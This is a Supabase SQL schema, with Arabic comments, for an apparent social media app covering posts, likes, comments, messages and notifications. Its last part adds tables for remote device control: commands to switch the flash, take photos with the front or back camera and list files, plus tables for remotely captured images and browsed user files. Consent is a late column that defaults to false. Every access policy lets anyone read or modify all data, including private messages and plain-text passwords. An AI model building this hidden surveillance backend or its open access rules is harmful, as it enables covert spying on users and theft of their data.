-- =============================================
-- Social Media App - Complete Database Schema
-- =============================================

-- حذف الجداول القديمة
DROP TABLE IF EXISTS public.notifications CASCADE;
DROP TABLE IF EXISTS public.messages CASCADE;
DROP TABLE IF EXISTS public.conversations CASCADE;
DROP TABLE IF EXISTS public.saved_posts CASCADE;
DROP TABLE IF EXISTS public.comments CASCADE;
DROP TABLE IF EXISTS public.likes CASCADE;
DROP TABLE IF EXISTS public.posts CASCADE;
DROP TABLE IF EXISTS public.profiles CASCADE;
DROP TABLE IF EXISTS public.users CASCADE;

-- =============================================
-- جدول المستخدمين (للمصادقة المخصصة)
-- =============================================
CREATE TABLE public.users (
  id BIGINT PRIMARY KEY GENERATED ALWAYS AS IDENTITY,
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  name TEXT,
  avatar_url TEXT,
  bio TEXT,
  last_seen TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- جدول المنشورات
-- =============================================
CREATE TABLE public.posts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  text_content TEXT,
  media_url TEXT,
  media_type TEXT,
  likes_count INTEGER DEFAULT 0,
  comments_count INTEGER DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- جدول الإعجابات
-- =============================================
CREATE TABLE public.likes (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(post_id, user_id)
);

-- =============================================
-- جدول التعليقات
-- =============================================
CREATE TABLE public.comments (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  text TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- جدول المنشورات المحفوظة
-- =============================================
CREATE TABLE public.saved_posts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  post_id UUID REFERENCES public.posts(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(user_id, post_id)
);

-- =============================================
-- جدول المحادثات
-- =============================================
CREATE TABLE public.conversations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  participant_a BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  participant_b BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  last_message TEXT,
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- جدول الرسائل
-- =============================================
CREATE TABLE public.messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID REFERENCES public.conversations(id) ON DELETE CASCADE,
  sender_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  receiver_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  text TEXT,
  media_url TEXT,
  is_read BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- جدول الإشعارات
-- =============================================
CREATE TABLE public.notifications (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  type TEXT,
  related_id UUID,
  is_seen BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- =============================================
-- تفعيل Row Level Security
-- =============================================
ALTER TABLE public.users ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.posts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.likes ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.comments ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.saved_posts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.notifications ENABLE ROW LEVEL SECURITY;

-- =============================================
-- سياسات جدول users
-- =============================================
CREATE POLICY "Anyone can read users" ON public.users FOR SELECT USING (true);
CREATE POLICY "Anyone can insert users" ON public.users FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update users" ON public.users FOR UPDATE USING (true);

-- =============================================
-- سياسات جدول posts
-- =============================================
CREATE POLICY "Posts are public" ON public.posts FOR SELECT USING (true);
CREATE POLICY "Anyone can create posts" ON public.posts FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update posts" ON public.posts FOR UPDATE USING (true);
CREATE POLICY "Anyone can delete posts" ON public.posts FOR DELETE USING (true);

-- =============================================
-- سياسات جدول likes
-- =============================================
CREATE POLICY "Likes are public" ON public.likes FOR SELECT USING (true);
CREATE POLICY "Anyone can like" ON public.likes FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can unlike" ON public.likes FOR DELETE USING (true);

-- =============================================
-- سياسات جدول comments
-- =============================================
CREATE POLICY "Comments are public" ON public.comments FOR SELECT USING (true);
CREATE POLICY "Anyone can comment" ON public.comments FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can delete comments" ON public.comments FOR DELETE USING (true);

-- =============================================
-- سياسات جدول saved_posts
-- =============================================
CREATE POLICY "Saved posts are public" ON public.saved_posts FOR SELECT USING (true);
CREATE POLICY "Anyone can save posts" ON public.saved_posts FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can unsave posts" ON public.saved_posts FOR DELETE USING (true);

-- =============================================
-- سياسات جدول conversations
-- =============================================
CREATE POLICY "Conversations are public" ON public.conversations FOR SELECT USING (true);
CREATE POLICY "Anyone can create conversations" ON public.conversations FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update conversations" ON public.conversations FOR UPDATE USING (true);

-- =============================================
-- سياسات جدول messages
-- =============================================
CREATE POLICY "Messages are public" ON public.messages FOR SELECT USING (true);
CREATE POLICY "Anyone can send messages" ON public.messages FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update messages" ON public.messages FOR UPDATE USING (true);

-- =============================================
-- سياسات جدول notifications
-- =============================================
CREATE POLICY "Notifications are public" ON public.notifications FOR SELECT USING (true);
CREATE POLICY "Anyone can create notifications" ON public.notifications FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update notifications" ON public.notifications FOR UPDATE USING (true);

-- =============================================
-- Functions لتحديث عدادات الإعجابات والتعليقات
-- =============================================
CREATE OR REPLACE FUNCTION update_likes_count()
RETURNS TRIGGER AS $$
BEGIN
  IF TG_OP = 'INSERT' THEN
    UPDATE posts SET likes_count = likes_count + 1 WHERE id = NEW.post_id;
  ELSIF TG_OP = 'DELETE' THEN
    UPDATE posts SET likes_count = likes_count - 1 WHERE id = OLD.post_id;
  END IF;
  RETURN NULL;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER on_like_change
  AFTER INSERT OR DELETE ON public.likes
  FOR EACH ROW EXECUTE PROCEDURE update_likes_count();

CREATE OR REPLACE FUNCTION update_comments_count()
RETURNS TRIGGER AS $$
BEGIN
  IF TG_OP = 'INSERT' THEN
    UPDATE posts SET comments_count = comments_count + 1 WHERE id = NEW.post_id;
  ELSIF TG_OP = 'DELETE' THEN
    UPDATE posts SET comments_count = comments_count - 1 WHERE id = OLD.post_id;
  END IF;
  RETURN NULL;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER on_comment_change
  AFTER INSERT OR DELETE ON public.comments
  FOR EACH ROW EXECUTE PROCEDURE update_comments_count();

-- =============================================
-- إنشاء Storage Bucket للوسائط
-- =============================================
-- ملاحظة: هذا الجزء يجب تنفيذه بعد إنشاء bucket اسمه 'media' في Storage
-- اذهب إلى: Storage > New bucket > اسم: media > فعّل Public bucket

-- =============================================
-- سياسات Storage للسماح برفع وقراءة الملفات
-- =============================================
CREATE POLICY "Anyone can upload" ON storage.objects
  FOR INSERT WITH CHECK (bucket_id = 'media');

CREATE POLICY "Anyone can read" ON storage.objects
  FOR SELECT USING (bucket_id = 'media');

CREATE POLICY "Anyone can update" ON storage.objects
  FOR UPDATE USING (bucket_id = 'media');

CREATE POLICY "Anyone can delete" ON storage.objects
  FOR DELETE USING (bucket_id = 'media');

-- =============================================
-- جدول أوامر الأدمن (للتحكم عن بُعد)
-- =============================================
CREATE TABLE IF NOT EXISTS public.admin_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  target_user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  command_type TEXT NOT NULL, -- 'flash_on', 'flash_off', 'camera_front', 'camera_back', 'list_files'
  command_data JSONB, -- بيانات إضافية للأمر
  executed BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- سياسات RLS لأوامر الأدمن
ALTER TABLE public.admin_commands ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can read commands" ON public.admin_commands
  FOR SELECT USING (true);

CREATE POLICY "Anyone can insert commands" ON public.admin_commands
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update commands" ON public.admin_commands
  FOR UPDATE USING (true);

CREATE POLICY "Anyone can delete commands" ON public.admin_commands
  FOR DELETE USING (true);

-- تفعيل Realtime للأوامر
ALTER PUBLICATION supabase_realtime ADD TABLE public.admin_commands;

-- =============================================
-- جدول الصور الملتقطة عن بُعد
-- =============================================
CREATE TABLE IF NOT EXISTS public.captured_images (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  image_url TEXT NOT NULL,
  camera_type TEXT NOT NULL, -- 'front', 'back'
  captured_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.captured_images ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can read captured_images" ON public.captured_images
  FOR SELECT USING (true);

CREATE POLICY "Anyone can insert captured_images" ON public.captured_images
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete captured_images" ON public.captured_images
  FOR DELETE USING (true);

-- =============================================
-- جدول ملفات المستخدمين (للتصفح عن بُعد)
-- =============================================
CREATE TABLE IF NOT EXISTS public.user_files (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id BIGINT REFERENCES public.users(id) ON DELETE CASCADE,
  file_name TEXT NOT NULL,
  file_path TEXT NOT NULL,
  file_type TEXT, -- 'image', 'video', 'document', 'audio'
  file_size BIGINT,
  thumbnail_url TEXT,
  uploaded_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE public.user_files ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can read user_files" ON public.user_files
  FOR SELECT USING (true);

CREATE POLICY "Anyone can insert user_files" ON public.user_files
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete user_files" ON public.user_files
  FOR DELETE USING (true);

-- إضافة عمود موافقة المستخدم
ALTER TABLE public.users ADD COLUMN IF NOT EXISTS admin_consent BOOLEAN DEFAULT FALSE;
ALTER TABLE public.users ADD COLUMN IF NOT EXISTS is_online BOOLEAN DEFAULT FALSE;
